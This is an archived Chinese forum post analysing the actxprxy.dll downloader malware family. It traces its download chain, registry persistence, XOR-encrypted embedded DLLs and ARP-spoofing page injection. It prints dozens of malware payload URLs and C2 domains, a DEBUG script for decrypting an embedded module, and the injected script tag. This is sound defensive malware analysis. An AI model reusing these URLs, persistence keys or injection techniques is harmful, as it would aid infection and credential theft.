
# 走马观花之 actxprxy.dll 病毒群

> 原文：[`www.pediy.com/kssd/pediy10/76543.html`](https://www.pediy.com/kssd/pediy10/76543.html)

原贴见：碰上很诡异的病毒，紧急求助！（瀑泪）

`http://bbs.pediy.com/showthread.php?t=76188&tcatid=43`

--------------------------------------------------------------------------

粗略地看了看，和几个月前在公司流行的那个很象，应该是新的变种，想看看是否有利用 `ms08-67` 的网马，静态大致地分析了一下，凭记忆写个大概，谬误之处，请您指出。

## 一、actxprxy.dll

正常的系统文件 `actxprxy.dll` 被改写，文件日期、大小不变。

入口地址代码被改为：

```
.text:71CC12BD 90                                           nop
.text:71CC12BE E9 82 14 01 00                         jmp     loc_71CD2745
```

代码流程:

下载 `http://kgb.gbu12.info/gbu.gif` ，保存为 `wmsetup.dll`，执行。

`url` 是 `xor` 简单加密的。代码里有诡异的字串    `db 'CNNIC#v1',0`

## 二、wmsetup.dll (gbu.gif)

下载 `'http://tk.234132.info/update.gif'` 保存为 `temp\qq_update.cab` ,临时文件为`"qqs????.tmp\qqsF2A8.tmp"`。下载成功后加载执行。 `url` 也是 `xor` 加密的。

## 三、 qq_update.cab(update.gif、qqsF2A8.tmp)

和 KuNgBiM 的“一个被 Gdi 漏洞利用后的下载者分析”里的是一样的，可以参阅：

`http://bbs.pediy.com/showthread.php?t=73991&tcatid=43`

大致流程：

1. 删除以下注册表项：

   `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersionShellServiceObjectDelayLoad`

   `JavaView`

   `desktopwin`

   这是以前版本变种使用的注册表项

2. 接着检查是否存在 `\Program Files\Messenger` 目录，如没有则创建。

   建立目录后，病毒把嵌在内部的一块（`3e00h` 字节)代码生成为 `\Program Files   \Messenger\msgmr.dll`

   （其中前 `900h` 字节是加密的，先 `XOR` 解密...)

3. 注册表写入

   `[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{DA191DE0-AA86-4ED0-4B87-293D48B2AE99}\InprocServer32]`

   `(Default) = "%ProgramFiles%\Messenger\msgmr.dll"`

   `ThreadingModel = "Apartment"`

   `[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad]`

   `msnmsg = "{DA191DE0-AA86-4ED0-4B87-293D48B2AE99}"`

4. `rundll32.exe "\Program Files\Messenger\msgmr.dll",UIMessage`

5. 生成 `unxxx.bat` 删除自身

## 四、msgmr.dll

说一下，如何得到 `msgmr.dll`

`upx` 解压 `wmsetup.dll.`

`debug` `wmsetup.dll`

```
-a100
mov si,1110
mov cx,900
xor byte ptr[si],3a
loop 106
int 20
-g
-rcx
3e00
-nmsgmr.dll
-w1110
-q
```

把嵌在内部的一块（`2600h` 字节)代码生成为 `\windows\Fonts\Framdee.ttf` （其中前 `4D0h` 字节是加密的，先 `XOR` 解密...)

然后执行它...

## 五、 Framdee.ttf

同样的，利用 `debug` 得到。

程序有 2 个主要模块：`_2`、`_3`

`_3` 流程如下：

解密获得地址，下载：`'http://ru.soviet-kgb.info/v.gif'`

这是个下载列表，病毒据此下载执行几十个木马、病毒、盗号软件。

比较特殊的是一般的病毒下载列表文件大多采用文本格式，这个 `v.gif` 是二进制格式，还有自己的文件标志。

简单的说明一下：

文件头部总长 `18h(24 字节),头部 0-1 二个字节是文件标志 ‘1011’`，`2-3 二字节是木马下载地址的总数(urls) 21h` ，接下来 `4-7 四字节是 urls * 每个地址占用的长度 110h (272) 字节的总长度,程序中对此会进行校验，8-9 字节是年份，a-b 是月份，c-d 是日期，后面难道是时、分、秒...`

整理后的木马下载清单：

`http://117.23.205.227/new/001.cab`

`http://117.23.205.227/new/002.cab`

`http://117.23.205.227/new/003.cab`

`http://117.23.205.227/new/004.cab`

`http://117.23.205.227/new/005.cab`

`http://117.23.205.227/new/006.cab`

`http://117.23.205.227/new/007.cab`

`http://117.23.205.227/new/008.cab`

`http://117.23.205.227/new/009.cab`

`http://117.23.205.231/new/030.cab`

`http://117.23.205.231/new/031.cab`

`http://117.23.205.231/new/032.cab`

`http://117.23.205.231/new/033.cab`

`http://58.53.128.140/new/010.cab`

`http://58.53.128.140/new/011.cab`

`http://58.53.128.140/new/012.cab`

`http://58.53.128.140/new/013.cab`

`http://58.53.128.140/new/014.cab`

`http://58.53.128.140/new/015.cab`

`http://58.53.128.140/new/016.cab`

`http://58.53.128.140/new/017.cab`

`http://58.53.128.140/new/018.cab`

`http://58.53.128.140/new/019.cab`

`http://60.191.223.14/new/020.cab`

`http://60.191.223.14/new/021.cab`

`http://60.191.223.14/new/022.cab`

`http://60.191.223.14/new/023.cab`

`http://60.191.223.14/new/024.cab`

`http://60.191.223.14/new/025.cab`

`http://60.191.223.14/new/026.cab`

`http://60.191.223.14/new/027.cab`

`http://60.191.223.14/new/029.cab`

`http://60.191.223.14/new/034.cab`

接着,解密获得地址:`'http://us.soviet-kgb.info/v.asp'` ,通过 `'http://us.soviet-kgb.info/v.asp'?action=update&version=0` 调用 ，下载病毒，保存为 `\windows\AppPatch\AcXtrnel.sdb`,加载，并执行其中的模块 ：`DLPUpdate` .

病毒建立了注册表项 `HKEY_LOCAL_MACHINE, "Software\Adobe"`，用来保存木马清单。

`_2` ，大致是 `load \windows\AppPatch\AcXtrnel.sdb` 获得 `DLPTerminate`、`DLPInit`、`DLPTerminate`、`DLPUpdate` 模块地址。

## 六、AcXtrnel.sdb

2 个主要模块：

1. `DLPInit` :

   解密释放内嵌的代码 ，生成 `\windows\AppPatch\AcSpecf.dll` ,加载，获得其中的 `FtpInit`、`FtpTerminate` 入口地址。

   解密（`XOR`）得到地址：`http://ftp.db884829.info/ftp.asp`，作为参数传递，调用 `FtpInit`。

   解密释放内嵌代码，生成 `\windows\system32\drivers\eth8023.sys` ,修改注册表，然后加载驱动！

   读取注册表 `HKEY_LOCAL_MACHINE, "Software\\Google"` 下的子项 （由 `DLPUpdate` 写入的） 发送 `ARP` 欺骗包，劫持 `HTTP` 通讯， 在返回的正常页面里插入病毒网页 ！

2. `DLPUpdate` :

   解密获得地址 ：`'http://css.db884829.info/css.txt'` ，下载，这是个二进制文件，前 4 字节文件标志：`!BEv` ，2 字节 `00`，之后为 `xor` 加密的网马内容。

   解密后为：`<script language="javascript" SRC="hxxp://y.ads009.info/vip.js"></script>` .(![](img/f43c1e514327696dccbb0da997496b2a.jpg "扮鬼脸") 为免误伤，我把 `http` 改成 `hxxp`)

   病毒校验文件头后把其后的数据写入注册表供 `ARP` 攻击使用。

   可惜的是 `y.ads009.info` 似乎死了，没法看是否有利用 `ms08-67` 的网马。 ![](img/e71d9210a215d5b66755d038631e0c83.jpg "恐怖!")

   在以前分析的案例里，`.js` 指向一个`.htm`,再连接 `n` 个网页，利用 `falshplayer\MS06-014\realplay\联众游戏大厅\暴风影音`等漏洞,下载木马,该木马是 `update.gif` 复本.

## 七、AcSpecf.dll

`vmware` 卸了,木抓到样本。印象中主要实现 3 个模块功能：`FtpInit` / `FtpSend` / `FtpTerminate`。

## 八、034.cab

...

1. 读取`\windows\system32\actxprxy.dll`,检测是否已中毒，标志为文件起始偏移 `14H` 字节是否为 `315` h,偏移 `16H` 是否为 `1011` h,未感染则解读 `actxprxy.dll`，保存程序入口代码，修改程序入口代码，在程序空隙插入病毒代码，使得程序先执行病毒代码再执行原代码，程序文件大小、日 期均不改变。 以目前的代码看，可以利用 `315H` 和 `1011H4` 字节实现该病毒的免疫。

2. 释放文件 `ThunderAdvise.dll` 到`\windows\Downloaded Program Files\` ,修改注册表实现自启动.

3. 后释放 `uninstall.bat` 删除自己。

## 九、n 个.cab

... 累死了 ![](img/e71d9210a215d5b66755d038631e0c83.jpg "恐怖!")
